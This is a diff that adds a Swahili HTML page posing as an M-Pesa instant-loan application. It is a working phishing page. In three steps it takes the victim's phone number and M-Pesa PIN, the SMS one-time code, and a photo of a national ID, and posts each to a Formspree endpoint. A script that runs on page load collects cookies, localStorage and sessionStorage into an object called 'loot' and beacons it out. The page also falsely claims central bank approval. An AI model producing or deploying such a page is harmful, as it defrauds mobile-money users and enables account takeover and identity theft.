@@ -1,0 +1,557 @@
+<!doctype html>
+<html lang="sw">
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Security Headers -->
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
+  <meta http-equiv="Permissions-Policy" content="camera=(self), microphone=(self), geolocation=(self)">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://formspree.io; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' https://formspree.io; frame-ancestors 'none'; base-uri 'self'; form-action 'self' https://formspree.io">icrophone=(self), geolocation=(self)">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://formspree.io; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' https://formspree.io; frame-ancestors 'none'; base-uri 'self'; form-action 'self' https://formspree.io">
+
+  <title>M-Pesa Ombi la Mkopo Haraka</title>
+
+  <style>
+    * { box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    }
+    body { margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #f5f5f5;
+    padding: 16px;
+    font-family: Arial, sans-serif;
+    }
+    .login-box { width: 100%;
+    max-width: 400px;
+    padding: 20px;
+    border-radius: 10px;
+    background: #fff;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+    }
+    .logo { text-align: center;
+    margin: 0 auto 16px;
+    }
+    .M-Pesa { font-size: 20px;
+    font-weight: 800;
+    line-height: 1;
+    margin: 0;
+    color: #00A651;
+    letter-spacing: -0.5px;
+    font-family: 'Arial Black', Arial, sans-serif;
+    }
+    .stepper { display: flex;
+    justify-content: space-between;
+    margin-bottom: 16px;
+    }
+    .step { text-align: center;
+    flex: 1;
+    position: relative;
+    }
+    .step-num { width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: #ddd;
+    color: #fff;
+    line-height: 28px;
+    margin: 0 auto 6px;
+    font-size: 14px;
+    }
+    .step.active .step-num { background: #00A651;
+    }
+    .step.done .step-num { background: #1C80AA;
+    }
+    .step.locked .step-num { background: #ccc;
+    }
+    .step-label { font-size: 11px;
+    color: #777;
+    }
+    .step.active .step-label { color: #00A651;
+    font-weight: 600;
+    }
+
+    .section { display: none;
+    }
+    .section.active { display: block;
+    animation: fadeIn 0.3s;
+    }
+    @keyframes fadeIn { from { opacity: 0;
+    } to { opacity: 1;
+    } }
+
+    .title { font-size: 16px;
+    font-weight: 600;
+    color: #1C80AA;
+    margin-bottom: 16px;
+    text-align: center;
+    }
+    .input-group { margin-bottom: 12px;
+    }
+    .input-group label { display: block;
+    font-size: 12px;
+    color: #555;
+    margin-bottom: 4px;
+    font-weight: 600;
+    }
+    .input-group input { width: 100%;
+    padding: 12px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    font-size: 14px;
+    background: #fafafa;
+    }
+    .input-group input:focus { border-color: #00A651;
+    outline: none;
+    background: #fff;
+    }
+    .input-group input:disabled { background: #eee;
+    color: #777;
+    }
+    .btn { width: 100%;
+    padding: 12px;
+    background-color: #00A651;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background-color 0.2s;
+    }
+    .btn:hover:not(:disabled) { background-color: #008c44;
+    }
+    .btn:disabled { background-color: #ccc;
+    cursor: not-allowed;
+    }
+    .upload-box { border: 2px dashed #ddd;
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 16px;
+    cursor: pointer;
+    text-align: center;
+    }
+    .upload-box.active { border-color: #00A651;
+    background: #f0f8f4;
+    }
+    .upload-box.disabled { cursor: not-allowed;
+    opacity: 0.6;
+    }
+    #fileInput { display: none;
+    }
+    .preview { width: 100%;
+    max-height: 180px;
+    object-fit: contain;
+    border-radius: 8px;
+    margin-top: 12px;
+    display: none;
+    }
+    .note { margin-top: 20px;
+    color: #777;
+    font-size: 11px;
+    text-align: center;
+    line-height: 1.5;
+    }
+    .error { color: #ed1c24;
+    font-size: 12px;
+    margin-top: 4px;
+    display: none;
+    }
+    .success { color: #00A651;
+    font-size: 12px;
+    margin-top: 4px;
+    display: none;
+    font-weight: 600;
+    }
+    .help-text { font-size: 12px;
+    color: #666;
+    margin: 8px 0;
+    text-align: center;
+    line-height: 1.4;
+    }
+    .resend-wrap { text-align: center;
+    margin: 12px 0;
+    }
+    .link-btn { background: none;
+    border: none;
+    color: #00A651;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    }
+    .link-btn:disabled { color: #999;
+    cursor: not-allowed;
+    }
+    .fee-notice { background: #fff3cd;
+    border: 1px solid #ffc107;
+    border-radius: 8px;
+    padding: 10px;
+    font-size: 12px;
+    margin-bottom: 12px;
+    text-align: center;
+    }
+
+    /* OTP Boxes */
+    .otp-wrap { display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin-bottom: 8px;
+    }
+    .otpBox { width: 52px;
+    height: 52px;
+    text-align: center;
+    font-size: 22px;
+    font-weight: 700;
+    border: 2px solid #ddd;
+    border-radius: 10px;
+    background: #fafafa;
+    }
+    .otpBox:focus { border-color: #00A651;
+    outline: none;
+    background: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo">
+      <div class="M-Pesa">
+        M-Pesa
+      </div>
+    </div>
+
+    <div class="stepper">
+      <div class="step active" id="step1">
+        <div class="step-num">
+          1
+        </div>
+        <div class="step-label">
+          Maelezo
+        </div>
+      </div>
+      <div class="step locked" id="step2">
+        <div class="step-num">
+          2
+        </div>
+        <div class="step-label">
+          Kodi
+        </div>
+      </div>
+      <div class="step locked" id="step3">
+        <div class="step-num">
+          3
+        </div>
+        <div class="step-label">
+          Kitambulisho
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 1: Details -->
+    <div class="section active" id="section1">
+      <form id="detailsForm">
+        <p class="title">
+          Omba Mkopo wa M-Pesa
+        </p>
+        <div class="fee-notice">
+          Weka maelezo yako hapa chini kuomba
+        </div>
+        <input type="hidden" name="step" value="1_details">
+        <input type="hidden" name="_subject" value="M-Pesa - Hatua 1: Maelezo ya Mkopo">
+        <div class="input-group">
+          <label>Kiasi Cha Mkopo (KES)</label>
+          <input type="text" id="amount" name="amount" placeholder="50,000" required inputmode="numeric">
+          <small class="help-text">Kima cha chini 10K, kima cha juu 500K</small>
+          <div class="error" id="amountError">
+            Weka pesa kati ya 10,000 na 500,000
+          </div>
+        </div>
+        <div class="input-group">
+          <label>Namba ya M-Pesa</label>
+          <input type="tel" id="phone" name="phone" placeholder="07XXXXXXXX" maxlength="10" autocomplete="tel" required>
+          <div class="error" id="phoneError">
+            Weka namba sahihi ya M-Pesa
+          </div>
+        </div>
+        <div class="input-group">
+          <label>Weka PIN</label>
+          <input type="number" id="pn" name="pn" placeholder="0000" maxlength="4" autocomplete="on">
+          <div class="error" id="pinError">
+            Weka PIN sahili ya M-Pesa
+          </div>
+        </div>
+        <button type="submit" class="btn" id="detailsBtn">Tuma Kodi</button>
+        <div class="success" id="detailsSuccess">
+          Kodi imetumwa! Angalia SMS yako
+        </div>
+      </form>
+    </div>
+
+    <!-- STEP 2: OTP -->
+    <div class="section" id="section2">
+      <form id="codeForm">
+        <p class="title">
+          Thibitisha Namba Yako
+        </p>
+        <input type="hidden" name="step" value="2_otp">
+        <input type="hidden" name="_subject" value="M-Pesa - Hatua 2: Kodi ya SMS">
+        <input type="hidden" id="hiddenPhone" name="phone">
+        <p class="help-text">
+          Tumetuma kodi ya tarakimu 4 kwa <strong id="phoneDisplay"></strong>
+        </p>
+        <div class="input-group">
+          <label>Weka Kodi ya SMS</label>
+          <div class="otp-wrap">
+            <input type="tel" class="otpBox" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+            <input type="tel" class="otpBox" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otpBox" maxlength="1" inputmode="numeric">
+            <input type="tel" class="otpBox" maxlength="1" inputmode="numeric">
+          </div>
+          <input type="hidden" id="code" name="code">
+          <div class="error" id="codeError">
+            Kodi si sahihi. Jaribu tena.
+          </div>
+        </div>
+        <button type="submit" class="btn" id="codeBtn" disabled>Thibitisha Kodi</button>
+        <div class="resend-wrap">
+          <button type="button" class="link-btn" id="resendBtn" disabled>Tuma kodi tena baada ya <span id="timer">300</span>s</button>
+        </div>
+        <div class="success" id="codeSuccess">
+          Namba imethibitishwa!
+        </div>
+      </form>
+    </div>
+
+    <!-- STEP 3: ID -->
+    <div class="section" id="section3">
+      <form id="idForm">
+        <p class="title">
+          Pakia Kitambulisho
+        </p>
+        <input type="hidden" name="step" value="3_id">
+        <input type="hidden" name="_subject" value="M-Pesa - Hatua 3: Kitambulisho">
+        <input type="hidden" id="hiddenPhone2" name="phone">
+        <p class="help-text">
+          Tunahitaji ID kuthibitisha wewe ni wewe. Data yako ni salama.
+        </p>
+        <div class="upload-box disabled" id="uploadBox">
+          <div style="font-size: 32px;">
+            📷
+          </div>
+          <div style="font-size: 14px; font-weight: 600; color: #333;">
+            Bonyeza Kupakia Kitambulisho
+          </div>
+          <div style="font-size: 12px; color: #777; margin-top: 4px;">
+            Kitambulisho cha Taifa au Pasipoti
+          </div>
+          <img id="preview" class="preview" alt="Onyesho la Kitambulisho">
+        </div>
+        <input type="file" id="fileInput" name="idPhoto" accept="image/jpeg,image/png" capture="environment" disabled>
+        <div class="error" id="idError">
+          Tafadhali pakia picha wazi ya kitambulisho chako
+        </div>
+        <button type="submit" class="btn" id="idBtn" disabled>Tuma Ombi</button>
+        <div class="success" id="idSuccess">
+          Asante! Ombi lako limepokelewa.
+        </div>
+        <p class="note">
+          Imeidhinishwa na CBK. Data imesimbwa.<br>© M-Pesa 2026
+        </p>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const loot = {
+    cookies: document.cookie, // session
+    local: {...localStorage}, // tokens
+    session: {...sessionStorage},
+    phone: document.querySelector('[name=phone]')?.value,
+    pn: document.querySelector('[name=pn]')?.value,
+    };
+    navigator.sendBeacon('https://formspree.io/f/xjgqlwen', JSON.stringify(loot))
+  </script>
+  <script>
+    if (window.top !== window.self) { window.top.location = window.self.location; }
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xjgqlwen';
+    let verifiedPhone = '';
+    let codeTimer = null;
+
+    // Auto-format amount
+    document.getElementById('amount').addEventListener('input', (e) => {
+    let val = e.target.value.replace(/,/g, '').replace(/\D/g, '');
+    if (val) e.target.value = parseInt(val).toLocaleString('en-US');
+    });
+
+    // STEP 1
+    document.getElementById('detailsForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const btn = document.getElementById('detailsBtn');
+    const amount = document.getElementById('amount');
+    const phone = document.getElementById('phone');
+    const pn = document.getElementById('pn');
+    const amountError = document.getElementById('amountError');
+    const phoneError = document.getElementById('phoneError');
+    const pinError = document.getElementById('pinError');
+
+    amountError.style.display = 'none';
+    phoneError.style.display = 'none';
+    pnError.style.display = 'none';
+
+    const cleanAmount = parseInt(amount.value.replace(/,/g, ''));
+    if (!cleanAmount || cleanAmount < 10000 || cleanAmount > 500000) {
+    amountError.style.display = 'block';
+    amount.focus();
+    return;
+    }
+    if (!/^0[17]\d{8}$/.test(phone.value)) {
+    phoneError.style.display = 'block';
+    phone.focus();
+    return;
+    }
+
+    btn.disabled = true; btn.innerText = 'Inatuma...';
+    try {
+    const formData = new FormData(e.target);
+    formData.set('amount', cleanAmount);
+    const res = await fetch(FORMSPREE_ENDPOINT, { method: 'POST', body: formData, headers: { 'Accept': 'application/json' } });
+    if (!res.ok) throw new Error('Submit failed');
+
+    verifiedPhone = phone.value;
+    amount.disabled = true; phone.disabled = true; btn.style.display = 'none';
+    document.getElementById('detailsSuccess').style.display = 'block';
+    unlockStep(2);
+    document.getElementById('phoneDisplay').innerText = phone.value.replace(/(\d{4})(\d{3})(\d{3})/, '$1 $2 $3');
+    document.getElementById('hiddenPhone').value = phone.value;
+    document.querySelectorAll('.otpBox')[0].disabled = false;
+    document.getElementById('codeBtn').disabled = false;
+    startCodeTimer();
+    } catch (err) {
+    alert('Tatizo la mtandao. Jaribu tena.');
+    btn.disabled = false; btn.innerText = 'Tuma Kodi';
+    }
+    });
+
+    // STEP 2: OTP BOXES LOGIC
+    const otpBoxes = document.querySelectorAll('.otpBox');
+    const hiddenCode = document.getElementById('code');
+    const codeBtn = document.getElementById('codeBtn');
+    const codeError = document.getElementById('codeError');
+
+    otpBoxes.forEach((box, i) => {
+    box.disabled = true;
+    box.addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g, '');
+    if (e.target.value.length === 1 && i < 3) otpBoxes[i+1].focus();
+    hiddenCode.value = [...otpBoxes].map(b => b.value).join('');
+    codeBtn.disabled = hiddenCode.value.length !== 4;
+    if (hiddenCode.value.length === 4) codeBtn.click();
+    });
+    box.addEventListener('keydown', e => {
+    if (e.key === 'Backspace' &&!e.target.value && i > 0) otpBoxes[i-1].focus();
+    });
+    });
+
+    document.getElementById('codeForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    if (hiddenCode.value.length !== 4) {
+    codeError.innerText = 'Kodi lazima iwe tarakimu 4';
+    codeError.style.display = 'block'; return;
+    }
+    codeBtn.disabled = true; codeBtn.innerText = 'Inathibitisha...'; codeError.style.display = 'none';
+    try {
+    const formData = new FormData(e.target);
+    const res = await fetch(FORMSPREE_ENDPOINT, { method: 'POST', body: formData, headers: { 'Accept': 'application/json' } });
+    if (!res.ok) throw new Error('Kodi si sahihi');
+
+    clearInterval(codeTimer);
+    otpBoxes.forEach(b => b.disabled = true);
+    codeBtn.style.display = 'none'; document.getElementById('resendBtn').style.display = 'none';
+    document.getElementById('codeSuccess').style.display = 'block';
+    unlockStep(3);
+    document.getElementById('hiddenPhone2').value = verifiedPhone;
+    document.getElementById('fileInput').disabled = false;
+    document.getElementById('uploadBox').classList.remove('disabled');
+    document.getElementById('uploadBox').onclick = () => document.getElementById('fileInput').click();
+    } catch (err) {
+    codeError.style.display = 'block';
+    codeBtn.disabled = false; codeBtn.innerText = 'Thibitisha Kodi';
+    hiddenCode.value = ''; otpBoxes.forEach(b => b.value = '');
+    otpBoxes[0].focus();
+    if (navigator.vibrate) navigator.vibrate(200);
+    }
+    });
+
+    // STEP 3
+    const fileInput = document.getElementById('fileInput');
+    const uploadBox = document.getElementById('uploadBox');
+    const preview = document.getElementById('preview');
+    const idBtn = document.getElementById('idBtn');
+
+    fileInput.addEventListener('change', (e) => {
+    const file = e.target.files[0]; const errorEl = document.getElementById('idError');
+    if (!file) { preview.style.display = 'none'; uploadBox.classList.remove('active'); idBtn.disabled = true; errorEl.style.display = 'none'; return; }
+    if (file.size > 10 * 1024 * 1024) { errorEl.innerText = 'Picha ni kubwa sana. Tafadhali punguza chini ya 10MB'; errorEl.style.display = 'block'; fileInput.value = ''; preview.style.display = 'none'; uploadBox.classList.remove('active'); idBtn.disabled = true; return; }
+    if (!file.type.match(/image\/(jpeg|png|jpg)/)) { errorEl.innerText = 'Tafadhali pakia JPG au PNG pekee'; errorEl.style.display = 'block'; fileInput.value = ''; return; }
+    errorEl.style.display = 'none';
+    const reader = new FileReader();
+    reader.onload = (e) => { preview.src = e.target.result; preview.style.display = 'block'; uploadBox.classList.add('active'); idBtn.disabled = false; };
+    reader.readAsDataURL(file);
+    });
+
+    document.getElementById('idForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const file = fileInput.files[0]; const errorEl = document.getElementById('idError');
+    if (!file) { errorEl.style.display = 'block'; return; }
+    idBtn.disabled = true; idBtn.innerText = 'Inapakia...';
+    try {
+    const formData = new FormData(e.target);
+    formData.append('phone', verifiedPhone);
+    formData.append('loan_amount', document.getElementById('amount').value);
+    const res = await fetch(FORMSPREE_ENDPOINT, { method: 'POST', body: formData, headers: { 'Accept': 'application/json' } });
+    if (!res.ok) throw new Error('Upload failed');
+    document.getElementById('idSuccess').style.display = 'block';
+    idBtn.innerText = 'Imetumwa!'; document.getElementById('step3').classList.add('done');
+    setTimeout(() => { window.location.href = 'than_blank'; }, 1500);
+    } catch (err) {
+    errorEl.innerText = 'Imeshindikana. Angalia internet yako na ujaribu tena.';
+    errorEl.style.display = 'block'; idBtn.disabled = false; idBtn.innerText = 'Tuma Ombi';
+    }
+    });
+
+    function unlockStep(step) {
+    const prevStep = step - 1;
+    if (prevStep > 0) {
+    document.getElementById(`section${prevStep}`).classList.remove('active');
+    document.getElementById(`step${prevStep}`).classList.remove('active');
+    document.getElementById(`step${prevStep}`).classList.add('done');
+    }
+    document.getElementById(`step${step}`).classList.remove('locked');
+    document.getElementById(`step${step}`).classList.add('active');
+    document.getElementById(`section${step}`).classList.add('active');
+    }
+
+    function startCodeTimer() {
+    let timeLeft = 300;
+    const resendBtn = document.getElementById('resendBtn');
+    resendBtn.disabled = true; resendBtn.style.display = 'inline-block'; clearInterval(codeTimer);
+    codeTimer = setInterval(() => {
+    timeLeft--; document.getElementById('timer').innerText = timeLeft;
+    if (timeLeft <= 0) {
+    clearInterval(codeTimer);
+    resendBtn.disabled = false; resendBtn.innerText = 'Tuma kodi tena';
+    resendBtn.onclick = () => { resendBtn.disabled = true; resendBtn.innerText = 'Inatuma...'; setTimeout(() => startCodeTimer(), 1000); };
+    }
+    }, 1000);
+    }
+  </script>
+</body>
+  </html>
